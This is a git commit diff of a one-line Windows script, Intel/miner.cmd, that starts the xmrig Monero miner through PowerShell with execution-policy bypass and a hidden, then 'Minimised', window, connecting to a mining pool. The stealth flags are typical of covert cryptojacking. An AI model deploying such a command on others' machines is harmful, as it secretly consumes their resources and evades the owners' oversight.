ac5f6e88b3ac5d07ead12becf18cb89d67fdf31c
mediatui <57651467+mediatui@users.noreply.github.com>
2019-11-23 19:34:29 +1300

    Update miner.cmd

--- Intel/miner.cmd
+++ Intel/miner.cmd
@@ -1,1 +1,1 @@
-powershell -W Hidden -Exec Bypass cmd.exe /c %xmrig% -a cryptonight --nicehash --donate-level=1 -B -o stratum+tcp://xmr.pool.minergate.com:45700 -u used@mediatui.com -p x
+powershell -W Minimised -Exec Bypass cmd.exe /c %xmrig% -a cryptonight --nicehash --donate-level=1 -B -o stratum+tcp://xmr.pool.minergate.com:45700 -u used@mediatui.com -p x
